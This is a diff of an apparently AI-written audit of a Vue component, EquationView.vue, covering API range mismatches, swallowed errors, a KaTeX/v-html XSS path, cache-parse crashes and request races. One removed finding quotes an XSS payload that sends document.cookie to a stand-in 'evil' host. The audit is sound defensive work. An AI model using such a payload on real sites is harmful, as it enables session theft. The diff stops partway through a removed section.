@@ -1,404 +1,369 @@
 claude-opus-5[1m]
 
-# CHALLENGE C — CONSUMPTION · `EquationView.vue`
+# CHALLENGE C — CONSUMPTION · `EquationView.vue` · **v2 (superseding)**
 
-**Subject** `fourier-analysis/web/src/components/equation/EquationView.vue` (469 lines)
+**Subject** `/Users/mkbabb/Programming/fourier-analysis/web/src/components/equation/EquationView.vue` (469 lines)
 **Axis** C — how this seat consumes value.js `0.13` · keyframes `4.3` · glass-ui `^4.0.0` · the 45-operation fourier API; props/emits contract quality; integration seams.
-**Method** static + source-derived only. No browser tooling. Every livable-only claim is marked `UNPROVEN-NEEDS-LIVE` (SS-13). Read whole: the SFC + all 12 files in its import closure + the two Python files behind its two operations + the installed producer `.d.ts`/`.css` surfaces.
-**Posture** the component is assumed DEFECTIVE until the tree proves otherwise. Every claim below carries its own falsifier; the four superlatives carry falsifiers too (L-18 runs both ways).
-
-**Read closure** (all read, read-only): `EquationView.vue` · `lib/equation/api.ts` · `lib/equation/types.ts` · `lib/equation/notation.ts` · `lib/api.ts` · `lib/api-problem.ts` · `lib/colors.ts` · `lib/types.ts` · `composables/useCoeffHover.ts` · `composables/useEquationCache.ts` · `FunctionInput.vue` · `EquationResult.vue` · `EquationModeToggle.vue` · `EqCoefficientsPanel.vue` · `ConvergencePlot.vue` · `lib/harmonics.ts` · `ui/SliderControl.vue` · `api/routers/equations.py` · `api/models/equations.py` · `api/main.py` · installed `@mkbabb/glass-ui@4.0.0` d.ts + token css · installed `@mkbabb/value.js@0.13.0` + producer `value.js@4.0.0` `package.json` · `katex@0.17.0` types.
-
-**Tally** 27 defects — **4 BLOCKER** · 12 MAJOR · 11 MINOR — and **4 superlatives**.
+**Substrate** fourier HEAD `cd26c6533adc32dfe1453d74117d3cb73b89ea16` (re-verified live; matches intake X-4 / R4-9) + the in-scope working-tree modifications — `EquationView.vue` is one of the 24 dirty in-scope paths, so all line numbers below are **working tree**.
+**Method** static + source-derived only. No browser tooling. Livable-only claims marked `UNPROVEN-NEEDS-LIVE` (SS-13).
+**Posture** the component is assumed DEFECTIVE until the tree proves otherwise. Every claim carries its falsifier; the superlatives carry falsifiers too (L-18 runs both ways).
 
 ---
 
-## §0 — Corpus fold (hitherto; cited, not re-invented)
+## §0 — SUPERSESSION NOTICE (read first)
 
-Folded from `formation/fourier/lane-frontend.md`, `formation/fourier/CENSUS-2026-08-03.md`, and the adjudicated `audit/codex-provenance/intakes/lane-fourier-r3-r6.md`. Where the tree disagrees I say so explicitly.
+A v1 of this challenge existed at this path (2026-08-04, same served model, 27 defects / 4 BLOCKER / 4 superlatives). **It is folded whole, not discarded.** Its finding ids (`D-01`…`D-28`, `S-01`…`S-04`) are preserved verbatim so any ledger citing them stays valid.
 
-| corpus row | what it says | this challenge |
+This v2 does four things:
+
+1. **FOLDS** every v1 row, with disposition (§1).
+2. **CORRECTS two v1 rows** where the tree disagrees — `D-03` (severity overstated: the one site that touches user input does **not** set `trust`) and `D-16` (timing wrong: the oklch failure is **live today at glass-ui 4.0.0**, not a post-F.W1 risk).
+3. **SHARPENS three** (`D-01` numeric receipt from the *shipped defaults*; `D-02` the exact discard mechanism; `D-11` the optional-peer nuance + the real reason 0.13.0 is pinned).
+4. **ADDS 10 net-new findings** (`C-29`…`C-38`), including one BLOCKER v1 did not reach, plus **2 net-new superlatives** and the facility-19 corpus source v1 did not cite.
+
+**v2 tally — 37 defects (5 BLOCKER · 16 MAJOR · 13 MINOR · 3 INFO) · 6 superlatives.**
+
+**Read closure** (all read, read-only): the SFC + `FunctionInput` · `EquationResult` · `EquationModeToggle` · `ConvergencePlot` · `EqCoefficientsPanel` · `composables/{useCoeffHover,useEquationCache,useCurveTransition}` · `lib/harmonics.ts` · `lib/equation/{api,types,notation}.ts` · `lib/{api,api-problem,colors,golden-shimmer,types}.ts` · `ui/{SliderControl,CollapsibleSection,tooltip}` · `shared/CoefficientsSpectrum.vue` · `web/{package.json,vite.config.ts,src/style.css}` · `api/routers/equations.py` · `api/models/equations.py` · `api/services/computation.py` · `api/main.py` · `src/fourier_analysis/symbolic/parsing.py` · installed `@mkbabb/{value.js,glass-ui,keyframes.js}` `dist/` + `package.json` exports/peers · `web/e2e/*.spec.ts`.
+
+**Corpus source v1 missed.** `fourier-analysis/docs/tranches/N/valuejs-inbound-2026-07-27-facility19-migration-table.md` — the value.js→fourier facility-19 letter, **sitting untracked in fourier's own tree**. It is directly on this axis (it is the F.W2 payload) and it independently establishes the colour defect. Folded at `D-16`/`C-30`.
+
+---
+
+## §1 — DISPOSITION OF v1 (all 28 rows + 4 superlatives)
+
+| v1 id | v1 sev | v2 disposition |
 |---|---|---|
-| `lane-frontend.md:130` | EquationView 469 lines, "`/equation` route shell; tabs + hover-card coefficient popovers" | **CONFIRMED** at 469 lines. |
-| `lane-frontend.md:473` | `./hover-card` removed at glass-ui 5.0.0 → `<Popover>`; 2 imports, one is `EquationView.vue:9` | **CONFIRMED + SHARPENED** → D-13: the surviving seat is `HoverPopover` (`./hover-popover`, already installed at 4.0.0), not a raw `<Popover>`; EquationView hand-paints its substrate. |
-| `lane-frontend.md:472` | `./metric-badge` removed at 7.0.0 → `./metric` (`Metric`); 7 imports/6 files incl. `EquationView.vue:10` | **CONFIRMED** (D-16). |
-| `lane-frontend.md:480` / `CENSUS §…:38` | value.js live import surface = 5 bare-root specifiers / 4 files, easing-only; "latent, not live, while 0.13.0 remains installed" | **CONFIRMED and re-scoped** → D-10: **3 of the 5 sit inside EquationView's own import closure**. And **CONTRADICTED on one point** — see D-11: it is *not* purely latent. glass-ui 4.0.0's own `peerDependencies` reject 0.13.0 **today**. |
-| `CENSUS §…:184-188` (F.W1 / F.W2) | tri-package uplift is one atomic transaction; F.W2 = "5 bare specifiers → `/easing`, delete the `colors.ts` hand-rolled arms (declared 3-line hex residual)" | **CONFIRMED as a plan; CONTRADICTED on the residual size** — D-21: the arm EquationView actually reaches (`VIZ_COLORS.amber` via `useCoeffHover.ts:65`) carries a *dead documented fallback* and a grey-on-failure mode. The residual is not 3 lines of hex; it is a live correctness contract. |
-| intake `R6-8` | "an API-operation record that embeds derived client back-references cannot attribute a defect to one side of the seam"; carry → F.W5 | **CITED and instantiated** — D-05 and D-19 are exactly this shape on the `equations` pair: two magic `500`s and one `budget` range are duplicated across the seam with no join, so a break is unattributable from either side alone. |
-| intake `X-3` | 45 total API operations / 30 public-non-admin / 13 admin; "the security gate is 0 of 45" | **CITED.** EquationView owns 2 of the 45 (`POST /api/equations/compute`, `POST /api/equations/simplify`). Both have client edges (so they are *not* in R3-7c's 9-operation client gap) — but see D-01/D-06: having an edge is not having a contract. |
-| `lane-frontend.md:70` | `reka-ui`/`cva`/`clsx`/`tailwind-merge` are dead devDeps | **EXTENDED** → D-27: `lucide-vue-next` is the inverse defect — a **live runtime import** (`EquationView.vue:11`) declared in `devDependencies`. |
-| `lane-frontend.md:624` | coverage gap: ConvergencePlot's rAF is a second ungated clock; its `reduce` block is CSS-only | **CITED, not re-litigated** (that is axis D/L territory). Consumption-relevant only insofar as EquationView is the mount that starts it. |
+| D-01 budget range → 422, swallowed | BLOCKER | **FOLDED + SHARPENED** — §2.1 adds the step-by-step receipt *from the shipped defaults* (v1's scenario needed `budget=11`, a non-default). |
+| D-02 error surfacing collapses | BLOCKER | **FOLDED + SHARPENED** — §2.2 names the discard mechanism in `api-problem.ts:38-47`. |
+| D-03 user `expression` → `trust:true` → `v-html` | BLOCKER | **CORRECTED → MINOR** — §4 `D-03`. The `trust:true` sites are server/numeric-fed; the user-input site (`ConvergencePlot.vue:256`) leaves `trust` at its `false` default. v1's own falsifier said "the ConvergencePlot leg is not falsified" — **it is**. |
+| D-04 unvalidated cache parse → blank mount | BLOCKER | **FOLDED intact.** |
+| D-05 `notation` inert in the default sigma mode | MAJOR | **FOLDED + PROMOTED → BLOCKER** — §2.4. `eqMode` defaults to `"sigma"` (`:43`), so this is the *default* view; a primary control that silently does nothing meets the same bar as D-01. |
+| D-06 compute/simplify race, no generation guard | MAJOR | **FOLDED** + one addition: the race also writes a structurally inconsistent `(result, latex)` pair to `sessionStorage` at `:141`, which C-29's restore path reads back as authoritative. |
+| D-07 `loading` computed has zero consumers | MAJOR | **FOLDED intact.** |
+| D-08 `HoverCard` + global CSS reimplements installed `HoverPopover` | MAJOR | **FOLDED intact** — `dist/components/custom/hover-popover/` re-verified present at 4.0.0. |
+| D-09 `.cartoon-card` × 5 on a resurrection shim | MAJOR | **FOLDED intact.** |
+| D-10 3 of 5 value.js bare specifiers in this closure | MAJOR | **FOLDED intact** — independently corroborated by facility-19 **I-1** ("the bare specifier stays retired (D-1)"). |
+| D-11 installed value.js violates glass-ui's peer range | MAJOR | **FOLDED + CORRECTED-IN-PART** — §3 `D-11`. The range *is* violated; v1 omits that the peer is declared **optional**, and misses *why* 0.13.0 is pinned at all. |
+| D-12 2 of 4 glass-ui imports on the deletion list | MAJOR | **FOLDED intact** — matches `lane-frontend.md:472-473`. |
+| D-13 triple breakpoint authority + [1023,1024) dead band | MAJOR | **FOLDED intact** (supersedes my own weaker draft of this row). |
+| D-14 `reconstructed_points` dead payload | MAJOR | **FOLDED intact** — re-verified: `grep -rn "reconstructed_points" web/src web/e2e` → 1 hit, the type declaration. |
+| D-15 `BasisComponent` round-trip + self-inflicted cast | MAJOR | **FOLDED intact.** |
+| D-16 dead amber fallback; grey-on-failure | MAJOR | **FOLDED + CORRECTED on timing** — §3 `D-16`. The failure is **live at the installed 4.0.0**, not contingent on F.W1. |
+| D-17 whole-response re-serialise per simplify | MAJOR | **FOLDED intact.** |
+| D-18 hand-inlined lucide `info` SVG beside the imported `Info` | MINOR | **FOLDED intact** (`:277-279` vs `:11`/`:300`). |
+| D-19 two unlinked magic `500`s across the seam | MINOR | **FOLDED intact.** |
+| D-20 one hand-rolled v-model among six `v-model:` | MINOR | **FOLDED intact.** |
+| D-21 unearned optionality on 4 always-passed props | MINOR | **FOLDED intact.** |
+| D-22 `:disabled="!effectiveN"` can never fire | MINOR | **FOLDED intact** (sharper than my independent draft). |
+| D-23 `SegmentedTabs` `string` model forces a cast | MINOR | **FOLDED intact** — producer-side; owes the glass BH inbox a relay under the standing edict. |
+| D-24 `SegmentedTabs.responsive` unused | MINOR | **FOLDED intact.** |
+| D-25 two shadow idioms in one file | MINOR | **FOLDED intact** (`:400` tokenised vs `:465` hardcoded `rgba(0,0,0,0.12)`, dark-mode-blind). |
+| D-26 stale line citation (`:61` vs `:59`) | MINOR | **FOLDED intact** — independently re-verified. |
+| D-27 `lucide-vue-next` runtime import in `devDependencies` | MINOR | **FOLDED intact.** |
+| D-28 zero functional e2e on `/equation` | MINOR | **FOLDED + PROMOTED → MAJOR** — §3 `D-28`. It is the reason five blockers ship: all five are `vue-tsc`-clean. |
+| S-01 E.W5 cast retirement is structural | superlative | **FOLDED intact.** |
+| S-02 `useCoeffHover` extraction + delegated hit-test | superlative | **FOLDED intact.** |
+| S-03 the `:116-118` ordering comment | superlative | **FOLDED intact.** |
+| S-04 client documents the server's sampling convention | superlative | **FOLDED intact.** |
 
 ---
 
-## §1 — BLOCKERS
+## §2 — BLOCKERS (5)
 
-### D-01 · BLOCKER · `budget` control range is 2× the operation's validated range → single-gesture 422, silently swallowed
+### 2.1 · D-01 — `budget` walks past the operation's bound *automatically*, from the shipped defaults
 
-**Provenance**
-- `EquationView.vue:29` `const budget = ref(cached?.budget ?? 10)`
-- `EquationView.vue:208` `:viz-harmonics="vizHarmonics"` → `FunctionInput.vue:217` `:max="Math.max(2, vizHarmonics ?? nHarmonics)"`
-- `EquationView.vue:53-55` `vizHarmonics = autoHarmonics ? min(effectiveN, nHarmonics) : nHarmonics`
-- `FunctionInput.vue:184` harmonics slider `:min="1" :max="100"` → `nHarmonics` ∈ [1, 100]
-- `ui/SliderControl.vue:41-43,55` clamps to `[props.min, props.max]` — i.e. clamps *to 100*, not to the server bound
-- `EquationView.vue:110` `budget: budget.value` in the compute body; `EquationView.vue:137` `simplifyCoefficients(components.value, budget.value, notation.value)`
-- `api/models/equations.py:23` `budget: int = Field(default=10, ge=2, le=50)` (ComputeEquationRequest)
-- `api/models/equations.py:41` `budget: int = Field(default=6, ge=2, le=50)` (SimplifyRequest)
+**FOLDED + SHARPENED.** v1 established the range mismatch (client offers 100, `api/models/equations.py:23,40` both `le=50`) and the silent swallow. Its failure scenario, however, required `budget = 11` at `oldV = 20` — a state the user must first create.
 
-**Claim.** The client's own "Display terms" slider offers `budget` up to **100**; both operations reject anything above **50** with a FastAPI 422. The gap is not reachable only by pathology — it is one drag of a visible control.
-
-**Failure scenario (exact).** Load `/equation` → drag *Harmonics* to 100 (`nHarmonics=100`, `autoHarmonics→false`, so `vizHarmonics=100`) → drag *Display terms* to 51 → `watchDebounced` (`:177-181`) fires `doSimplify()` after 200 ms → `POST /api/equations/simplify` with `budget: 51` → pydantic `le=50` → **422**. `doSimplify`'s catch is `if (!isAbortError(e)) { /* silent */ }` (`:143`) — literally an empty block. `error` is never set, `simplifying` returns to `false`, and the equation card keeps rendering the previous LaTeX. **The user's control moved, the server refused, and nothing anywhere said so.** Press *Compute* in the same state and `doCompute` sends `budget: 51` too (`:110`) → 422 → `error.value = e.message`, which is empty (see D-02) → the error banner's `v-if="error"` is false → still nothing.
-
-There is also an *automatic* path that does not require touching the budget slider. `EquationView.vue:151-159`:
-```
-watch(vizHarmonics, (v, oldV) => {
-    if (budget.value > v) { budget.value = Math.max(2, v); }
-    else if (oldV != null && oldV > 0 && budget.value <= oldV) {
-        const ratio = budget.value / oldV;
-        budget.value = Math.max(2, Math.round(v * ratio));
-    }
-});
-```
-With `oldV = 20`, `budget = 11`, `v = 100` → `ratio = 0.55` → `budget = 55` > 50 → 422, with the user having touched only the *Harmonics* slider. The clamp branch (`budget.value = Math.max(2, v)`) caps at `v`, which is itself up to 100 — so no branch of this watcher knows the server bound exists.
-
-**Falsifier.** Show any clamp of `budget` to ≤ 50 on the client, or a server bound ≥ 100 on either model. Neither exists: `grep -n "50" EquationView.vue` yields no bound, `SliderControl`'s clamp is parameterised by `props.max` which is `vizHarmonics`, and both pydantic fields read `le=50` verbatim. Falsified also if `simplify`'s empty catch surfaced the error some other way — it does not; `error` is written at exactly one site, `:123`, inside `doCompute`.
-
-**R6-8 shape.** The constraint lives in the operation record only. The client leaf carries no back-reference to it, so neither side can be blamed from its own artifacts — precisely the lesson `lane-fourier-r3-r6.md` R6-8 carries to F.W5.
-
----
-
-### D-02 · BLOCKER · error surfacing collapses to the empty string — the equation operations are outside fourier's own problem+json envelope
-
-**Provenance**
-- `EquationView.vue:123` `error.value = e instanceof Error ? e.message : "Computation failed"`
-- `EquationView.vue:229` `v-else-if="error && !result"` · `:243` `v-else-if="error"` — both gate on **truthiness**
-- `lib/api.ts:182` `throw await ApiProblem.from(res)`
-- `lib/api-problem.ts:19-31` `class ApiProblem extends Error { constructor(type, title, …) { super(title) } }` — `message === title`
-- `lib/api-problem.ts:38-46` `title: typeof title === "string" ? title : response.statusText`
-- `api/routers/equations.py` — **no** problem+json anywhere; `grep -rn "problem+json" api/` returns hits only in `visualizations.py:16`, `admin.py:15` and tests
-- `api/main.py:114-122` the only app-level handler returns `JSONResponse(status_code=500, content={"detail": "Internal server error"})` — `application/json`, no `title`
-
-**Claim.** Every non-2xx from `/api/equations/*` is plain `application/json`, so `ApiProblem.from` falls through to `title = response.statusText`. Over HTTP/2 `Response.statusText` is the empty string (HTTP/2 removed the reason phrase; browsers expose `""`). `super("")` ⇒ `e.message === ""` ⇒ `error.value = ""` ⇒ both `v-if`s are false ⇒ **the failure renders as nothing at all**: `computing` flips false, the previous result (or the empty state) stays on screen, and the user has no signal that a request was made and refused.
-
-**Failure scenario.** Deploy behind HTTP/2 (the normal case for a TLS deployment). Trigger D-01's 422, or any 500 from `submit_compute_job` (a malformed expression that `parse_expression` rejects goes through `unhandled_exception_handler`). Client-side: `ApiProblem{ type:"about:blank", title:"", status:422|500, detail: undefined }` → `error.value = ""` → silent.
-
-Compounding: the 500 handler *does* populate a usable string (`detail: "Internal server error"`), and `ApiProblem` *does* capture it (`api-problem.ts:43`) — but EquationView reads `.message` and never `.detail`, `.status`, or `.type`. `grep -rn "ApiProblem" web/src/components/equation/ web/src/lib/equation/` → **1 hit, and it is prose in a comment** (`lib/equation/api.ts:7`). The seat wires into a typed RFC 9457 error class and then throws away every field the class exists to carry, degrading it to `Error.message`.
-
-The irony is on the record: `lib/equation/api.ts:5-8` states the E.W5 collapse was performed so there would be "one place to wire ApiProblem + RateLimit retry." The two equation operations are exactly the two that never got the envelope.
-
-**Falsifier.** Show a problem+json exception handler covering `/api/equations/*`, or a consumer read of `ApiProblem.detail`/`.status` in the equation subtree, or a non-empty `statusText` guarantee. None exist. The HTTP/2-empty-`statusText` half is `UNPROVEN-NEEDS-LIVE` (needs a real h2 response object); the HTTP/1.1 half is provable now and is *also* defective — `title` becomes `"Unprocessable Entity"`, an unactionable string that hides the field-level `detail` array the server actually sent.
-
----
-
-### D-03 · BLOCKER · user-typed `expression` reaches `katex.renderToString(…, { trust: true })` and then `v-html` — EquationView is the propagating seat
-
-**Provenance**
-- `FunctionInput.vue:98-111` free-text `<input v-model="expression">`, `spellcheck="false"`, no validation
-- `EquationView.vue:199` `v-model:expression="expression"` — EquationView owns the ref
-- `EquationView.vue:315` `:expression="expression"` — EquationView hands the raw string across a prop boundary
-- `ConvergencePlot.vue:256` `katex.renderToString(latex, { throwOnError: false, displayMode: false })` inside `renderKatexInline`
-- `ConvergencePlot.vue:263-264` `renderKatexInline(\`f(x) = ${props.expression ?? …}\`)`
-- `ConvergencePlot.vue:353` `v-html="tooltipHtml"`
-- `EquationResult.vue:20-24` the sibling path: `katex.renderToString(props.latex, { …, trust: true })` → `:37` `v-html="renderedHtml"`; `EquationView.vue:255` `<EquationResult :latex="activeLatex" />`
-- `useCoeffHover.ts:99-101` third site, also `trust: true` → `EquationView.vue:264` `v-html="popoverHtml"`
-- `katex@0.17.0` `types/katex.d.ts:176-186`: *"If `false` (do not trust input), prevent any commands like `\includegraphics` that could enable adverse behavior… **If `true` (trust input), allow all such commands.**"* `@default false`.
-
-**Claim.** `trust: true` re-enables KaTeX's URL-bearing commands (`\href`, `\url`, `\includegraphics`). `throwOnError: false` does **not** mitigate this — it changes handling of *unknown* commands; `\href` is a *known* command gated solely by `trust`. EquationView is the component that (a) owns the untrusted string and (b) passes it, unsanitised, into a `trust:true` renderer whose output is `v-html`'d.
-
-**Failure scenario.** Type `x \href{javascript:fetch('//evil/'+document.cookie)}{ }` into the Expression field, hover the sum/original curve on the convergence plot → `tooltipHtml` contains a live `<a href="javascript:…">` injected via `v-html`. The string also round-trips through `sessionStorage` (`useEquationCache.ts:33`, key `eq-tab-state-v2`), so it survives reload. Currently self-XSS; it becomes cross-user the moment any equation state is shareable — and the repo already has a `/v/:visualizationSlug` sharing surface and a `visualizations` CRUD entity.
-
-**Falsifier.** Show a sanitiser between the input and the renderer, or `trust` set to a protocol-filtering function (KaTeX's documented mitigation, `katex.d.ts:180-181` "Provide a custom function `handler(context)`"), or evidence that `expression` is validated before binding. `grep -rn "trust" web/src/components/equation/` → three sites, all `trust: true`, zero handlers. Falsified for the `EquationResult`/`useCoeffHover` legs specifically if `latex`/`popoverHtml` are provably server- or numeric-only (they are: `latex` comes from the API, `popoverHtml` from `toFixed`) — **but the `ConvergencePlot` leg is client-string interpolation and is not falsified.** Severity stays BLOCKER on that leg.
-
----
-
-### D-04 · BLOCKER · unvalidated `JSON.parse` of `sessionStorage` into `ComputeEquationResponse`; the unguarded field access white-screens the route with no recovery path
-
-**Provenance**
-- `useEquationCache.ts:36-41` `loadCachedResult()` — `JSON.parse(raw)` returned as `CachedResult` with **zero** shape validation
-- `EquationView.vue:36-37` `const cachedRes = loadCachedResult(); const result = ref(cachedRes?.result ?? null)`
-- `EquationView.vue:59-67`
-  ```
-  const components = computed<BasisComponent[]>(() => {
-      if (!result.value) return [];
-      return result.value.coefficients.map((c: FourierTermDTO) => ({ … }));
-  });
-  ```
-  — guards the *object*, not the *field*
-- `EquationView.vue:174` `if (!result.value) doCompute();` — the only bootstrap, gated on the same object check
-- `EquationView.vue:72` `result.value?.coefficients ?? []` — the *correct* guard, three lines below the broken one, on the same field
-
-**Claim.** A `sessionStorage` entry that parses as JSON but lacks `result.coefficients` produces `result.value = {}` (truthy) → `components` throws `TypeError: Cannot read properties of undefined (reading 'map')` during the render pass → the `/equation` route mounts to a blank surface. Because `doCompute` is gated on `!result.value` (`:174`) and the poisoned entry is truthy, **no recompute ever runs and the state persists for the whole session tab**. There is no clear-cache affordance in the UI.
-
-**Failure scenario.** Any partial/interrupted `sessionStorage` write (`useEquationCache.ts:48` is a single `setItem` of a ~40 KB string, wrapped in a catch that swallows `QuotaExceededError`), any manual/extension edit, or any future API field rename that drops `coefficients` while the `-v2` key stays. The key is versioned; the *shape* is not checked. Ship a v3 response and the v2 key still deserialises into the v3 code path.
-
-**Falsifier.** Show a validator, a `zod`/schema parse, or a `coefficients` guard on line 61. `useEquationCache.ts` has no validation of any kind — its try/catch guards `JSON.parse` throwing, not the parsed value's shape. Falsified if Vue's render-error boundary recovers — it does not by default, and `grep -rn "onErrorCaptured\|errorHandler" web/src/` would need to show one covering this subtree.
-
-This is the exact failure family value.js's own W44 "born-RED blank" records in the project ledger — an unvalidated cached object producing an empty mount.
-
----
-
-## §2 — MAJOR
-
-### D-05 · MAJOR · `notation` is inert in the default display mode — `latex_sigma` is never refreshed by the cheap path
-
-**Provenance**
-- `EquationView.vue:43` `const eqMode = ref<EquationDisplayMode>("sigma")` — **sigma is the default**
-- `EquationView.vue:49-51` `activeLatex = eqMode === "sigma" && displayLatexSigma ? displayLatexSigma : displayLatex`
-- `EquationView.vue:114` `displayLatexSigma.value = result.value.latex_sigma` — written **only** inside `doCompute`
-- `EquationView.vue:138` `displayLatex.value = resp.latex` — `doSimplify` writes **only** the expanded form
-- `lib/equation/types.ts:42-46` `SimplifyResponse { latex; energy_captured; term_count }` — **no `latex_sigma`**
-- `api/models/equations.py:44-47` — server agrees; no `latex_sigma` on the simplify response
-- `api/routers/equations.py:97` `latex_sigma = render_latex_sigma(terms, req.notation)` — the sigma form **is** notation-dependent
-- `EquationView.vue:177-181` `watchDebounced([notation, budget], () => { if (result.value) doSimplify(); }, { debounce: 200 })` — comment at `:176` reads *"Cheap re-render on notation/budget change"*
-
-**Claim.** In the default `sigma` mode, `activeLatex` is `displayLatexSigma`, which only `doCompute` writes. Changing the Notation pill fires `doSimplify`, which updates `displayLatex` — a value the sigma view never reads. **The Notation control produces no visible change until the user presses Compute.** The `budget` control is inert in sigma mode too, but that one is at least *documented* (`FunctionInput.vue:215` subtitle "shown in expanded (a+b) view") and is inert by backend construction (`render_latex_sigma(terms, notation)` takes no budget). The notation case has no such excuse: the backend renders sigma per-notation, and the cheap path simply doesn't ask for it.
-
-**Failure scenario.** Load `/equation` (sigma default) → click *Exp* → 200 ms later a `POST /simplify` fires and succeeds → the pill shows Exp, `lastDisplayKey` advances to `…|exponential|10` → the rendered equation is still trigonometric. Click *Polar* → same. The state machine now believes the display is current for polar (`lastDisplayKey` matches), so any later `doSimplify` early-returns at `:133`. The displayed notation and the selected notation diverge permanently.
-
-**Falsifier.** Show `latex_sigma` on `SimplifyResponse`, or a `displayLatexSigma` write outside `doCompute`, or `eqMode` defaulting to `expanded`. None hold — the field appears at exactly two lines in the SFC (`:39` init, `:114` in `doCompute`) and is absent from both the TS and pydantic simplify models.
-
-### D-06 · MAJOR · `compute` and `simplify` race on `displayLatex` — independent abort keys, no generation guard
-
-**Provenance**
-- `lib/equation/api.ts:27` abort key `"eq-compute"` · `:51` abort key `"eq-simplify"`
-- `lib/api.ts:52-59` `abortable(key)` aborts only the *same-key* inflight controller
-- `EquationView.vue:113` `displayLatex.value = result.value.latex` (compute) · `:138` `displayLatex.value = resp.latex` (simplify) — two writers, no sequencing
-- `EquationView.vue:116-118` the acknowledged ordering hazard: `lastDisplayKey = displayKey()` captured before `effectiveN` updates
-
-**Claim.** A compute and a simplify can be in flight simultaneously (different keys ⇒ neither aborts the other) and both write `displayLatex`. Last writer wins, and there is no request-generation counter.
-
-**Failure scenario A (stale coefficients).** Press Compute; while it is in flight, nudge the notation pill → 200 ms later `doSimplify` sends `components.value` — the *old* result's coefficients (`components` is evaluated at call time, `:137`). If simplify resolves after compute, `displayLatex` holds the LaTeX of the **previous function** while `ConvergencePlot` (`:311-312`, bound to `result.original_points`/`result.coefficients`) plots the **new** one. The equation and the plot disagree.
-
-**Failure scenario B (sticky wrong notation).** Same interleave, opposite resolution order. `doCompute` resolves last and at `:118` writes `lastDisplayKey = displayKey()` — which reads the **current** `notation.value` (already changed mid-flight) joined to the **new** `lastComputeKey`. `displayLatex`/`displayLatexSigma` hold the *pre-change* notation from the response body. `doSimplify` will now early-return at `:133` because `key === lastDisplayKey`. The mismatch is sticky until some other input changes.
-
-**Falsifier.** Show a shared abort key, a generation token, or an `await`-ordering guard. `grep -n "abortInflight\|generation\|seq" EquationView.vue` → nothing. `lib/api.ts:61-66` exports `abortInflight(keys)` — the tool exists and this seat never calls it. The `:116-118` comment proves the author saw the ordering hazard on one axis and stopped one step short of the general fix.
-
-### D-07 · MAJOR · dead reactive state — `loading` has zero consumers, so the simplify round-trip is invisible
-
-**Provenance**
-- `EquationView.vue:57` `const loading = computed(() => computing.value || simplifying.value);`
-- `grep -n "loading\|simplifying" EquationView.vue` → `:34`, `:57`, `:135`, `:145` **only**. The template uses `computing` (`:221`, `:239`) and never `loading`.
-
-**Claim.** `loading` is unreferenced; therefore `simplifying` — its only other reader — reaches no pixel. The 200 ms-debounced simplify round-trip (a real network request, up to ~15 KB of coefficients uploaded) has **no** progress indication anywhere in the template. `<script setup>` does not tree-shake unreferenced top-level computeds, so this also ships a live effect scope for nothing.
-
-**Falsifier.** Find `loading` in the template or in any child binding. It appears nowhere in `EquationView.vue` after line 57, and it is not exposed (no `defineExpose`).
-
-### D-08 · MAJOR · `HoverCard` + a 13-declaration **global** stylesheet reimplement `HoverPopover`, which is already installed
-
-**Provenance**
-- `EquationView.vue:9` `import { HoverCard, HoverCardTrigger, HoverCardContent } from "@mkbabb/glass-ui/hover-card"`
-- `EquationView.vue:274` `<HoverCard :open-delay="200" :close-delay="150">` · `:282` `side="bottom" :side-offset="6" :collision-padding="12" align="end"`
-- `EquationView.vue:455-469` — a **non-scoped** `<style>` block defining `.info-hovercard` with `z-index`, `width`, `padding`, `color`, `background`, `border`, `border-radius`, `box-shadow`, `animation`, `user-select`
-- installed `@mkbabb/glass-ui@4.0.0` exports `./hover-popover`; `dist/components/custom/hover-popover/HoverPopover.vue.d.ts:1-50` — *"a popover-tier substrate (glass + border + radius) at tooltip cadence: hover-trigger, defer-on-leave timer, adaptive `side`/`align` that auto-flips off viewport edges"*, props `content` / `side` / `align` / `hoverOpenDelay` / `closeDelay` / `sideOffset`
-- `lane-frontend.md:473` — `./hover-card` is **removed at glass-ui 5.0.0**
-
-**Claim.** The design system ships, at the *installed* version, a component whose prop surface is a one-to-one match for what EquationView passes to `HoverCard` (`side`, `align`, `sideOffset`, open/close delays) and whose stated purpose is exactly the substrate the consumer hand-paints in global CSS. EquationView instead picked the primitive that gets **deleted at 5.0.0** and re-authored the surface by hand. Worse, the re-authoring is **unscoped**: `.info-hovercard` is a global selector emitted by a component, so any element with that class anywhere in the app inherits it, and the rule's specificity/order is load-dependent.
-
-**Falsifier.** Show that `HoverPopover` cannot host the two-row content (a tier chip + `MetricBadge`, then an `Info` line). Its d.ts documents *"Pass a default slot for richer content (kbd hints, secondary lines)"* — it can. Falsified also if `./hover-popover` were absent at 4.0.0; `ls node_modules/@mkbabb/glass-ui/dist/components/custom/hover-popover/` shows `HoverPopover.vue.d.ts` + `index.d.ts` present.
-
-### D-09 · MAJOR · `.cartoon-card` × 5 — the component is built on a glass-ui recipe the design system deleted
-
-**Provenance**
-- `EquationView.vue:230`, `:239`, `:243`, `:251`, `:308` — five `.cartoon-card` application sites (`grep -c` → 5)
-- `node_modules/@mkbabb/glass-ui/dist/styles/cards.css:2-3` — *"`.cartoon-card` + `.elevated-card` recipe classes were **removed at C.W5** per the W0 overfitting audit (Card's tier system covers both)"*
-- `web/src/style.css:98-110` — the consumer-side resurrection shim: `@utility cartoon-card { @apply cartoon-surface; border-color: var(--border); background: var(--card); }`, self-described as *"the dead-class resurrection"* and *"the fourier-local KISS stop-gap"*, with a "cross-repo re-publish recorded as a coordination ask"
-
-**Claim.** EquationView's entire card chrome rests on a class the producer removed and the consumer resurrected. The shim is honest and well-documented — that is not the defect. The defect is that the *consumption* was never migrated: the producer's stated replacement is `Card`'s tier system, and EquationView uses raw `<div class="cartoon-card">` five times instead. The shim converts a compile-time break into an indefinitely-deferred one, and the `@utility` directive means it silently stops working the day glass-ui reintroduces the name with different semantics.
-
-**Falsifier.** Show `.cartoon-card` still shipping from glass-ui 4.0.0. `grep -rn "cartoon-card" node_modules/@mkbabb/glass-ui/dist/styles/cards.css` returns only the removal comment. Falsified as a *consumption* claim if `<Card>` cannot express the surface — it can; `./card` is in the 4.0.0 exports map and the producer names it as the successor.
-
-### D-10 · MAJOR · 3 of the repo's 5 value.js bare-root specifiers live inside EquationView's import closure
-
-**Provenance** (`grep -rn 'from "@mkbabb/value.js"' web/src/` → 5 hits)
-- `components/equation/ConvergencePlot.vue:5` — EquationView's direct child (`:309`)
-- `components/equation/composables/useCurveTransition.ts:8` — pulled by `ConvergencePlot.vue:11`
-- `components/equation/lib/harmonics.ts:5` — pulled by `ConvergencePlot.vue:10`
-- (the other two are `lib/easings.ts:9,16`, outside this subtree)
